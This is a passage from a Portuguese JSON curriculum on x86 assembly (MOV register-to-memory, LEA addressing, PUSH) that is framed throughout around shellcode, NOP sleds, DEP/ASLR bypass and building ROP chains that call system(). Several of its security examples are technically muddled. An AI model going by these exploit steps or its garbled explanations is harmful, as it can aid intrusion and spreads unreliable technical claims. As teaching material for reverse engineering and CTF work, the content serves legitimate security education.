                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe e operandos (sem erros de colchetes ou tamanhos).",
                                "Sucesso na execução sem crashes ou faults de memória.",
                                "Correta depuração e verificação de valores pós-MOV.",
                                "Aplicação contextual em shellcode/exploit funcional.",
                                "Explicação clara de semântica e diferenças com outras MOV.",
                                "Identificação proativa de erros comuns."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Cache e hierarquia de memória.",
                                "Programação em C: Ponteiros e acesso indireto (*ptr = valor).",
                                "Engenharia Reversa: Disassembly em IDA Pro/Ghidra.",
                                "Segurança de Software: Desenvolvimento de ROP chains e shellcodes.",
                                "Sistemas Operacionais: Syscalls e modelagem de memória virtual."
                              ],
                              "realWorldApplication": "Fundamental em análise de malware para decodificar payloads em heap/stack, desenvolvimento de exploits para CTFs/pentesters, engenharia reversa de binários protegidos e criação de shellcodes evasivos em pentests reais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.1.4",
                            "name": "MOV de registrador para memória",
                            "description": "Escrever o valor de um registrador em um endereço de memória, ex: MOV [EBX], EAX, crítico para manipulação de payloads em engenharia reversa de binários ELF/PE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a sintaxe e semântica da instrução MOV reg-to-mem",
                                  "subSteps": [
                                    "Estude a documentação oficial da Intel para instruções MOV em x86-64, focando em operandos de destino indireto via registrador.",
                                    "Identifique que MOV [reg_base], reg_source escreve o conteúdo de reg_source no endereço apontado por reg_base.",
                                    "Analise exemplos: MOV [EBX], EAX move 32 bits de EAX para endereço em EBX.",
                                    "Diferencie de MOV mem-to-reg e entenda flags não afetadas (sem carry/overflow).",
                                    "Revise registradores de uso geral: EAX, EBX, etc., e endereçamento indireto."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a diferença entre MOV EAX, [EBX] e MOV [EBX], EAX, com um diagrama de registradores e memória.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (PDF ou online)",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": "Use diagramas visuais de registradores e pilha para fixar conceitos.",
                                  "learningObjective": "Dominar a sintaxe exata e o comportamento de escrita em memória via registrador indireto.",
                                  "commonMistakes": [
                                    "Confundir direção do MOV (reg-to-mem vs mem-to-reg)",
                                    "Ignorar tamanho dos operandos (32-bit vs 64-bit em x86-64)",
                                    "Esquecer que EBX deve conter endereço válido."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar ambiente de desenvolvimento e depuração para assembly x86",
                                  "subSteps": [
                                    "Instale NASM (assembler), GCC/ld (linker) e GDB (debugger) em Linux (ELF) ou x64dbg em Windows (PE).",
                                    "Crie um diretório de projeto e escreva um template de assembly minimalista com seções .text, .data.",
                                    "Compile um programa de teste simples: nasm -f elf64 test.asm -o test.o; ld test.o -o test.",
                                    "Execute GDB: gdb ./test e pratique comandos como 'break *main', 'run', 'x/10x $rsp' para examinar memória.",
                                    "Teste alocação de memória com .data ou alloca para simular endereços dinâmicos."
                                  ],
                                  "verification": "Compile e rode um 'hello world' em assembly, quebrando em main e examinando registradores com 'info registers'.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM, ld, GDB (Linux) ou x64dbg (Windows)",
                                    "Sistema Linux/Windows com privilégios de install"
                                  ],
                                  "tips": "Use VM se necessário para isolar ambiente; comece com ELF64 para consistência com payloads Linux.",
                                  "learningObjective": "Preparar toolchain para testar instruções MOV em binários reais ELF/PE.",
                                  "commonMistakes": [
                                    "Esquecer flags de linking (-f elf64)",
                                    "Não alinhar seções de memória",
                                    "Executar sem debugger, perdendo visibilidade."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Escrever e executar código assembly com MOV [reg], reg",
                                  "subSteps": [
                                    "Escreva código: mov ebx, 0x804a000 (endereço .data); mov eax, 0xdeadbeef; mov [ebx], eax.",
                                    "Defina variável em .data: myvar: dd 0; use ebx para apontar a ela.",
                                    "Assemble, link e execute: verifique com hexdump -C test ou GDB 'x/x $ebx'.",
                                    "Adicione loop para múltiplas escritas: mov ecx, 5; loop: mov [ebx + ecx*4], eax; dec ecx; jnz loop.",
                                    "Teste com registradores diferentes (RBX em x86-64) e valores dinâmicos."
                                  ],
                                  "verification": "Após execução, use GDB 'x/5x &myvar' para confirmar valores escritos corretamente na memória.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Editor como VSCode com extensão assembly",
                                    "GDB ou x64dbg",
                                    "Arquivo test.asm"
                                  ],
                                  "tips": "Sempre inicialize registradores para evitar segfaults; use 'disassemble' no GDB para confirmar opcode.",
                                  "learningObjective": "Implementar MOV reg-to-mem em código funcional e observar efeitos na memória.",
                                  "commonMistakes": [
                                    "Endereço inválido causando SIGSEGV",
                                    "Mismatch de tamanhos (mov [rbx], ax em vez de eax)",
                                    "Não preservar registradores callee-saved."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Debugar e aplicar em contexto de engenharia reversa de payloads",
                                  "subSteps": [
                                    "Carregue um binário ELF simples no GDB; injete MOV [rbx], rax via patch (set {int}0x804a000 = 0x12345678).",
                                    "Crie payload shellcode: bytes para mov rbx, addr; mov rax, shellcode_val; mov [rbx], rax.",
                                    "Teste em cenário de exploit: modifique payload para escrever NOP sled em memória remota.",
                                    "Use objdump -d para disassemble e pwndbg (GDB plugin) para rastrear memória.",
                                    "Simule PE em Windows com x64dbg: attach a processo e execute MOV [rbx], rax passo a passo."
                                  ],
                                  "verification": "Crie payload que escreve 'A'*(4) em endereço fixo; confirme com strings ou memória dump pós-execução.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "GDB com pwndbg (pip install pwndbg)",
                                    "Binário ELF de teste (ex: de CTF)",
                                    "x64dbg para PE"
                                  ],
                                  "tips": "Pratique com endereços ASLR off (setarch -R); grave sessão GDB para review.",
                                  "learningObjective": "Integrar MOV reg-to-mem em payloads para manipulação dinâmica de memória em reversa.",
                                  "commonMistakes": [
                                    "Null bytes em shellcode (use xor rax,rax; add para valores)",
                                    "Ignorar protections como W^X",
                                    "Não testar em ambos ELF/PE."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um shellcode para exploit ROP: mov rbx, 0x7fff0000 (stack pivot); mov rax, 0x41414141 (stage2 addr); mov [rbx], rax; ret; Isso sobreescreve return address na stack para chaining gadgets.",
                              "finalVerifications": [
                                "Conteúdo do registrador fonte é idêntico ao lido da memória destino pós-MOV.",
                                "Nenhuma alteração em flags (ZF, CF, etc.) ocorre após execução.",
                                "Opcode gerado é correto (89 03 para MOV [rbx], eax em x86).",
                                "Execução em GDB mostra endereço em reg_base válido e sem segfault.",
                                "Payload modificado roda sem crash em binário alvo ELF/PE.",
                                "Hexdump confirma escrita exata no offset esperado."
                              ],
                              "assessmentCriteria": [
                                "Sintaxe precisa na escrita do código assembly (operandos corretos).",
                                "Comportamento verificado via debugger (antes/depois comparações).",
                                "Aplicação contextual em reversa (payload funcional).",
                                "Tratamento de edge cases (endereços inválidos, tamanhos).",
                                "Eficiência: sem instruções desnecessárias ou loops ineficientes.",
                                "Documentação clara do código com comentários."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Endereçamento indireto e hierarquia memória-cache.",
                                "Programação em C: Equivalente a *ptr = reg_value; com ponteiros.",
                                "Segurança: Base para ROP chains, shellcode writing e buffer overflows.",
                                "Sistemas Operacionais: Modelos de memória virtual (paging em ELF/PE).",
                                "Análise Malware: Patching binários para evasão de detecção."
                              ],
                              "realWorldApplication": "Em engenharia reversa, usado para craftar payloads que escrevem shellcode em memória executável (bypass DEP/ASLR), modificar estruturas de dados em malwares ou injetar código em processos para análise dinâmica."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.4.2",
                        "name": "Instrução LEA",
                        "description": "A instrução LEA (Load Effective Address) calcula e carrega o endereço efetivo de um operando em um registrador, sem acessar memória, útil para aritmética de endereços em 32/64 bits.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.2.1",
                            "name": "LEA básica com registrador",
                            "description": "Calcular endereço simples como LEA EAX, [EBX], equivalente a MOV EAX, EBX mas otimizado para endereçamento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito fundamental da instrução LEA",
                                  "subSteps": [
                                    "Estude a definição de LEA: Load Effective Address, que carrega o endereço efetivo de um operando em um registrador sem acessar a memória.",
                                    "Analise exemplos simples de endereçamento: base, base+deslocamento, etc.",
                                    "Identifique que LEA realiza aritmética de endereços sem dereferência.",
                                    "Revise registradores de 32 bits como EAX, EBX em arquitetura x86.",
                                    "Leia documentação oficial da Intel sobre LEA."
                                  ],
                                  "verification": "Resuma em suas palavras o que LEA faz e dê um exemplo verbal de LEA EAX, [EBX].",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86",
                                    "Editor de texto para notas"
                                  ],
                                  "tips": "Foquem em 'endereço efetivo' vs. 'valor na memória'.",
                                  "learningObjective": "Entender o propósito de LEA como calculadora de endereços.",
                                  "commonMistakes": [
                                    "Confundir LEA com MOV (que carrega valor)",
                                    "Ignorar que não há acesso à memória"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Comparar LEA com a instrução MOV equivalente",
                                  "subSteps": [
                                    "Escreva assembly: MOV EAX, EBX vs. LEA EAX, [EBX].",
                                    "Compile e execute ambos em um assembler para observar saída.",
                                    "Meça ciclos de clock ou performance em debugger (LEA é mais rápida para aritmética simples).",
                                    "Discuta otimizações: LEA evita flags de status alteradas por ADD.",
                                    "Teste com deslocamentos: LEA EAX, [EBX + 4] vs. ADD EAX, 4."
                                  ],
                                  "verification": "Demonstre que ambos produzem o mesmo valor em EAX, mas explique a diferença em performance.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "NASM ou MASM assembler",
                                    "Debugger como OllyDbg ou x64dbg"
                                  ],
                                  "tips": "Use 'dumpbin' ou 'objdump' para inspecionar código gerado.",
                                  "learningObjective": "Diferenciar usos e vantagens de LEA sobre MOV ou ADD.",
                                  "commonMistakes": [
                                    "Achar que LEA sempre acessa memória",
                                    "Não testar em ambiente real"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Dominar a sintaxe básica de LEA com registrador simples",
                                  "subSteps": [
                                    "Escreva código: LEA EAX, [EBX]; MOV ECX, EAX para verificar.",
                                    "Varie registradores: LEA EDX, [ESI]; etc.",
                                    "Inclua em um programa completo com .data e .code seções.",
                                    "Assemble e linke: nasm -f elf32 arquivo.asm; ld arquivo.o.",
                                    "Execute e inspecione registradores pré e pós-LEA.",
                                    "Adicione print de EAX para confirmação."
                                  ],
                                  "verification": "Execute o código e confirme que EAX recebe o valor de EBX sem dereferência.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM",
                                    "GCC ou LD linker",
                                    "GDB debugger"
                                  ],
                                  "tips": "Sempre inicialize EBX com um valor conhecido como 0x12345678.",
                                  "learningObjective": "Codificar e depurar LEA básica corretamente.",
                                  "commonMistakes": [
                                    "Esquecer colchetes []",
                                    "Usar registrador inválido para sintaxe"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar e verificar em contexto de análise de binários",
                                  "subSteps": [
                                    "Compile um C simples que gere LEA equivalente (ex: int* p = &var;).",
                                    "Descompile com IDA Pro ou Ghidra para identificar LEA.",
                                    "Modifique binário para inserir LEA e observe em debugger.",
                                    "Analise em exploit: use LEA para calcular endereço de buffer.",
                                    "Registre diferenças em disassembly antes/depois.",
                                    "Teste cenários de segurança: LEA em ROP chains."
                                  ],
                                  "verification": "Identifique LEA em um binário real e explique seu papel.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ghidra ou IDA Free",
                                    "Binário de teste em C compilado",
                                    "x64dbg"
                                  ],
                                  "tips": "Use 'step into' no debugger para ver cálculo de endereço.",
                                  "learningObjective": "Integrar LEA em análise reversa e segurança.",
                                  "commonMistakes": [
                                    "Confundir offset com valor absoluto",
                                    "Não validar em 32-bit mode"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um programa de análise de vulnerabilidades, use LEA EAX, [EBX] para calcular o endereço de um buffer dinâmico sem acessar memória, otimizando uma chain ROP: mov ebx, buffer_addr; lea eax, [ebx+0x10]; call eax.",
                              "finalVerifications": [
                                "Explicar verbalmente diferença entre LEA EAX,[EBX] e MOV EAX,EBX.",
                                "Codificar e executar LEA básica com output correto.",
                                "Identificar LEA em disassembly de binário compilado.",
                                "Comparar performance com ADD em benchmark simples.",
                                "Aplicar em exemplo de segurança: calcular offset para bypass ASLR parcial.",
                                "Listar 3 vantagens de LEA em otimização de código."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe e execução sem erros de segmentação.",
                                "Compreensão conceitual comprovada por explicação clara.",
                                "Correta identificação e modificação em ferramentas de RE.",
                                "Eficiência: uso otimizado vs. alternativas como MOV/ADD.",
                                "Criatividade em aplicação real-world (ex: exploit ou otimização).",
                                "Documentação completa de testes e resultados."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Aritmética modular e cálculo de endereços.",
                                "Programação: Otimização de código em C/Assembly.",
                                "Segurança: Reverse engineering e construção de exploits.",
                                "Arquitetura de Computadores: Registradores e modos de endereçamento.",
                                "Algoritmos: Estruturas de dados e ponteiros."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware, LEA é usada para calcular endereços dinâmicos em shellcodes; compiladores modernos geram LEA para otimizações como strlen() ou array indexing, essencial em CTFs e análise forense digital."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.2.2",
                            "name": "LEA com deslocamento",
                            "description": "Adicionar deslocamento ao endereço, ex: LEA EAX, [EBX + 4], comum em acesso a arrays ou offsets em estruturas de malware.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de LEA e deslocamento",
                                  "subSteps": [
                                    "Revise a instrução LEA básica: carrega endereço efetivo sem acessar memória.",
                                    "Entenda o deslocamento (offset): valor constante adicionado ao registrador base.",
                                    "Compare LEA com MOV: LEA não dereferencia, apenas calcula endereço.",
                                    "Identifique usos comuns: acesso a arrays (ex: elemento i*size + base) ou campos de estruturas.",
                                    "Analise exemplo: LEA EAX, [EBX + 4] calcula EBX + 4 em EAX."
                                  ],
                                  "verification": "Explique em suas palavras a diferença entre LEA [EBX] e LEA [EBX + 4], com diagrama mental.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 LEA",
                                    "Emulador online como Godbolt ou emu8086"
                                  ],
                                  "tips": "Visualize a memória como um array linear; offset é o salto em bytes.",
                                  "learningObjective": "Dominar o propósito de LEA com deslocamento para cálculos de endereço.",
                                  "commonMistakes": [
                                    "Confundir com ADD (que modifica registrador base)",
                                    "Achar que LEA carrega o valor da memória"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar a sintaxe e operandos da LEA com deslocamento",
                                  "subSteps": [
                                    "Estude sintaxe: LEA reg_dest, [reg_base + disp] onde disp é constante 1-8 bytes.",
                                    "Pratique variações: [EBX + 4], [EBP - 8], [ESI + EAX*4 + 2] (SIB opcional).",
                                    "Verifique modos de endereço válidos em x86-32/64.",
                                    "Escreva 5 exemplos manuais em papel: um para array de ints, um para struct field.",
                                    "Use calculadora para simular: se EBX=0x1000, qual EAX em LEA EAX,[EBX+4]?"
                                  ],
                                  "verification": "Liste 3 sintaxes válidas e compute resultados para valores dados.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Manual de instruções x86 (Intel Vol.2)",
                                    "Editor de texto para pseudocódigo"
                                  ],
                                  "tips": "Lembre: disp pode ser negativo para offsets retroativos como stacks.",
                                  "learningObjective": "Construir instruções LEA com deslocamento corretas.",
                                  "commonMistakes": [
                                    "Usar parênteses como em C (errado em ASM)",
                                    "Esquecer tamanho do offset (byte/word/etc.)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar e testar LEA com deslocamento em código assembly",
                                  "subSteps": [
                                    "Escreva código NASM simples: mov ebx, array; lea eax, [ebx + 4]; debug eax.",
                                    "Monte e execute em emulador: defina array com dados, verifique eax == &array[1].",
                                    "Adicione loop: lea eax, [ebx + ecx*4] para array dinâmico.",
                                    "Teste em debugger: breakpoint na LEA, inspecione registradores e memória.",
                                    "Compare output com cálculo manual."
                                  ],
                                  "verification": "Execute código e confirme que EAX contém endereço correto, não valor.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "x32dbg ou OllyDbg",
                                    "Código base: section .data; array dd 1,2,3"
                                  ],
                                  "tips": "Use 'r eax' no debugger para ver valor imediatamente após LEA.",
                                  "learningObjective": "Executar e depurar LEA com offset na prática.",
                                  "commonMistakes": [
                                    "Não alinhar dados (causa offsets errados)",
                                    "Confundir endereço com conteúdo (use ? eax vs d eax)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar LEA com deslocamento em cenários de malware e estruturas",
                                  "subSteps": [
                                    "Simule estrutura: defina struct Pessoa {int id; char nome[20];} e acesse nome com LEA.",
                                    "Analise snippet de malware: lea eax, [ebx + esi*4 + 8] para tabela de offsets dinâmicos.",
                                    "Otimize código: substitua add por LEA para preservar base.",
                                    "Extraia de binário real: use IDA Pro ou Ghidra para encontrar LEA em amostra malware.",
                                    "Crie exercício: dado EBX=struct base, lea campo específico."
                                  ],
                                  "verification": "Analise código fornecido e identifique 2 usos de LEA com offset, explicando propósito.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ghidra ou IDA Free",
                                    "Amostra malware benigna (ex: crackme)",
                                    "Struct def em C para referência"
                                  ],
                                  "tips": "Em malware, LEA evita page faults ao calcular sem load.",
                                  "learningObjective": "Usar LEA em contextos reais de análise de binários.",
                                  "commonMistakes": [
                                    "Ignorar escalas SIB em offsets complexos",
                                    "Não considerar ASLR em offsets absolutos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um array de inteiros 'dados dd 10,20,30,40' com EBX apontando para 'dados', a instrução 'LEA EAX, [EBX + 8]' carrega em EAX o endereço de dados[2] (offset 8 bytes), permitindo acesso posterior sem modificar EBX, comum em loops de malware para percorrer payloads.",
                              "finalVerifications": [
                                "Escrever LEA com deslocamento correto para acessar array[3].",
                                "Explicar por que LEA é preferida sobre ADD em preservação de registradores.",
                                "Depurar e confirmar endereço em emulador.",
                                "Identificar LEA com offset em snippet de assembly de malware.",
                                "Calcular manualmente endereço para valores dados.",
                                "Diferenciar LEA de MOV em 3 cenários."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe (100% correto).",
                                "Compreensão conceitual (explicação clara sem erros).",
                                "Execução prática (código roda sem crashes).",
                                "Aplicação contextual (liga a malware/arrays).",
                                "Análise em debugger (identifica registradores corretos).",
                                "Criatividade em exemplos (adapta a cenários novos)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Aritmética de ponteiros (ptr + i == &ptr[i]).",
                                "Sistemas Operacionais: Gerenciamento de memória e offsets em heaps/stacks.",
                                "Análise Reversing: Identificação em binários com ferramentas como Ghidra.",
                                "Algoritmos: Otimização de acesso sequencial em arrays.",
                                "Segurança: Evasão de detecção em shellcodes via cálculos LEA."
                              ],
                              "realWorldApplication": "Na análise de malware, LEA com deslocamento é usado para acessar dinamicamente campos de estruturas de dados criptografados ou payloads em memória, evitando leituras diretas que poderiam disparar honeypots ou page faults, essencial em reverse engineering de ransomwares e trojans."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.2.3",
                            "name": "LEA com escalas e índices",
                            "description": "Usar escalas (x2, x4, x8) como LEA RAX, [RBX + RCX*8 + 16], poderoso para alocação dinâmica e ROP chains em análise binária.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a sintaxe da instrução LEA com escalas e índices",
                                  "subSteps": [
                                    "Estude a sintaxe geral: LEA reg, [base + index * scale + displacement]",
                                    "Identifique componentes: base (ex: RBX), index (ex: RCX), scale (1,2,4,8), displacement (constante como 16)",
                                    "Revise LEA básico sem escalas para comparação",
                                    "Analise exemplos simples como LEA RAX, [RBX + RCX*2]",
                                    "Memorize restrições de registradores (index não pode ser RSP/RBP em alguns modos)"
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a sintaxe completa com um exemplo próprio",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 LEA",
                                    "Compilador NASM",
                                    "Editor de texto"
                                  ],
                                  "tips": "Use diagramas para visualizar base + (index * scale) + disp",
                                  "learningObjective": "Dominar a estrutura sintática da LEA com escalas e índices",
                                  "commonMistakes": [
                                    "Confundir scale com multiplier simples",
                                    "Ignorar limites de scale (apenas 1,2,4,8)",
                                    "Usar registradores inválidos como index"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar e testar cálculos com escalas x2, x4 e x8",
                                  "subSteps": [
                                    "Escreva assembly para LEA RAX, [RBX + RCX*2 + 16]",
                                    "Compile e execute com valores iniciais (RBX=0x1000, RCX=5) e verifique RAX=0x101A",
                                    "Teste escalas x4 e x8 com GDB: passo a passo debug",
                                    "Varie displacement negativo e positivo",
                                    "Compare resultado com cálculo manual"
                                  ],
                                  "verification": "Execute no GDB e confirme que RAX contém o endereço calculado corretamente",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM",
                                    "GDB",
                                    "ld (linker)"
                                  ],
                                  "tips": "Use 'x/i $pc' no GDB para ver instrução desmontada",
                                  "learningObjective": "Calcular e verificar endereços usando diferentes escalas",
                                  "commonMistakes": [
                                    "Overflow em scale*index (use 64-bit regs)",
                                    "Esquecer de inicializar registradores base/index",
                                    "Confundir endereço efetivo com valor carregado"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar LEA em alocação dinâmica de memória",
                                  "subSteps": [
                                    "Simule array dinâmico: base=alocação, index=loop var * scale=sizeof(struct)",
                                    "Exemplo: LEA RAX, [RDI + RSI*8] para array de ponteiros",
                                    "Integre com malloc simulado em assembly",
                                    "Debug com heap watch no GDB",
                                    "Otimize código evitando MUL explícita"
                                  ],
                                  "verification": "Gere endereço válido para 10 elementos e acesse sem segfault",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GDB com heap commands",
                                    "Exemplos de código assembly dinâmico"
                                  ],
                                  "tips": "LEA é mais rápida que ADD+MUL para aritmética de arrays",
                                  "learningObjective": "Usar LEA para computar offsets em estruturas dinâmicas",
                                  "commonMistakes": [
                                    "Misalign de memória (use scale correto para tipos)",
                                    "Não zerar displacement em arrays simples",
                                    "Confundir com MOV para load real"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar uso de LEA em ROP chains para análise binária",
                                  "subSteps": [
                                    "Identifique gadgets LEA em binário com ROPgadget ou objdump",
                                    "Monte chain: LEA para stack pivot + escalas para offsets",
                                    "Exemplo: [RBX + RCX*8 + 16] para ROP com args dinâmicos",
                                    "Teste em ambiente controlado (pwntools ou manual)",
                                    "Analise binário real (ex: vuln app) por gadgets LEA"
                                  ],
                                  "verification": "Construa ROP chain funcional que execute system() via LEA gadgets",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "ROPgadget tool",
                                    "pwntools Python",
                                    "Binário vulnerável exemplo"
                                  ],
                                  "tips": "Procure LEA com RIP-relative para ASLR bypass parcial",
                                  "learningObjective": "Aplicar LEA em exploits ROP para manipulação de controle",
                                  "commonMistakes": [
                                    "Gadgets inválidos (check bad chars)",
                                    "Offsets errados em chain",
                                    "Ignorar endianness em displacement"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar e debugar cenários complexos",
                                  "subSteps": [
                                    "Crie exercício misto: alocação + ROP com LEA x8",
                                    "Introduza erros proposital (scale errado) e corrija",
                                    "Otimize assembly para performance",
                                    "Documente 3 usos reais encontrados em binários",
                                    "Auto-avaliação com verificações finais"
                                  ],
                                  "verification": "Resolva 3 exercícios independentes sem consulta",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Exercícios personalizados",
                                    "GDB avançado (watchpoints)"
                                  ],
                                  "tips": "Registre traces GDB para análise posterior",
                                  "learningObjective": "Consolidar conhecimento com prática integrada",
                                  "commonMistakes": [
                                    "Dependência excessiva de calculadora",
                                    "Não testar edge cases (index=0, max values)",
                                    "Subestimar impacto em 32 vs 64-bit"
                                  ]
                                }
                              ],
                              "practicalExample": "Exemplo em NASM:\nRBX = 0x1000  ; base\nRCX = 5       ; index\nLEA RAX, [RBX + RCX*8 + 16]  ; RAX = 0x1000 + 40 + 16 = 0x1028\nUse GDB: info reg rax para verificar.",
                              "finalVerifications": [
                                "Calcula corretamente endereço manualmente para LEA RAX, [RBX + RCX*4 - 8]",
                                "Implementa e debuga assembly com LEA em alocação de array de 8 structs",
                                "Encontra e usa 2 gadgets LEA em ROP chain para um binário vulnerável",
                                "Explica vantagens de LEA vs ADD/IMUL em otimização",
                                "Identifica erros comuns em código fornecido com LEA escalada",
                                "Aplica LEA em cenário real de análise binária"
                              ],
                              "assessmentCriteria": [
                                "Precisão nos cálculos de endereço (100% correto)",
                                "Correta implementação e execução sem crashes",
                                "Criatividade em aplicações ROP e dinâmicas",
                                "Profundidade na análise de erros comuns",
                                "Eficiência temporal (dentro dos estimates)",
                                "Documentação clara de exemplos e verificações"
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Aritmética linear e multiplicadores",
                                "Programação C: Ponteiros, arrays multidim e malloc",
                                "Análise Reversa: Desmontagem com objdump/radare2",
                                "Sistemas Operacionais: Gerenciamento de heap/stack",
                                "Criptografia: Offsets em estruturas de chaves dinâmicas"
                              ],
                              "realWorldApplication": "Em pentesting e CTFs, LEA com escalas é essencial para construir ROP chains eficientes em binários sem gadgets aritméticos raros, permitindo stack pivots e alocações dinâmicas em exploits reais como em desafios de buffer overflow avançados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.4.3",
                        "name": "Instrução PUSH",
                        "description": "A instrução PUSH decrementa ESP/RSP e escreve um valor na pilha, usada para alocação temporária e preparação de parâmetros para chamadas de sistema em assembly.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.3.1",
                            "name": "PUSH de registrador",
                            "description": "Empilhar conteúdo de registrador, ex: PUSH EAX, preservando valores antes de chamadas como int 0x80 em 32 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos fundamentais da instrução PUSH",
                                  "subSteps": [
                                    "Estude a definição de PUSH: empilha o conteúdo de um registrador na pilha (stack), decrementando ESP em 4 bytes (modo 32 bits).",
                                    "Revise a pilha em x86: estrutura LIFO, ESP aponta para o topo.",
                                    "Analise o formato: PUSH reg (ex: PUSH EAX copia EAX para [ESP-4] e ESP -=4).",
                                    "Compare com POP: PUSH é o oposto.",
                                    "Leia documentação oficial Intel para PUSH."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito o que acontece com ESP e a memória após PUSH EAX.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 (volume 2), diagrama da stack x86"
                                  ],
                                  "tips": "Visualize a stack crescendo para baixo na memória (endereços decrescentes).",
                                  "learningObjective": "Entender o mecanismo de empilhamento e impacto na stack pointer.",
                                  "commonMistakes": [
                                    "Confundir PUSH com MOV (PUSH ajusta ESP automaticamente)",
                                    "Ignorar alinhamento de 4 bytes em 32 bits"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar ambiente para experimentação com assembly",
                                  "subSteps": [
                                    "Instale NASM para montagem e ld para linkagem em Linux 32 bits.",
                                    "Configure GDB para depuração de código assembly.",
                                    "Crie um template de programa assembly minimalista com seções .text e .data.",
                                    "Teste compilação: nasm -f elf32 arquivo.asm && ld -m elf_i386 arquivo.o -o exec.",
                                    "Execute no GDB: gdb ./exec, use 'x/10xw $esp' para inspecionar stack."
                                  ],
                                  "verification": "Compile e execute um programa vazio no GDB sem erros.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM, ld, GDB, VM 32 bits (ex: Ubuntu i386)"
                                  ],
                                  "tips": "Use 'info registers' no GDB para monitorar EAX e ESP em tempo real.",
                                  "learningObjective": "Preparar ferramentas para codificação e depuração segura.",
                                  "commonMistakes": [
                                    "Usar 64 bits sem -m elf_i386 (compatibilidade 32 bits)",
                                    "Esquecer privilégios de execução"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar PUSH de registrador simples",
                                  "subSteps": [
                                    "Escreva código: mov eax, 0x12345678; push eax; (verifique stack).",
                                    "Adicione POP para restaurar e comparar registradores.",
                                    "Inspecione no GDB: break após PUSH, 'x/4xw $esp' para ver valor empilhado.",
                                    "Teste com múltiplos PUSH: push ebx; push ecx; observe ESP decrementando.",
                                    "Registre valores de registradores antes/depois."
                                  ],
                                  "verification": "No GDB, confirme que [ESP] contém o valor original de EAX após PUSH.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
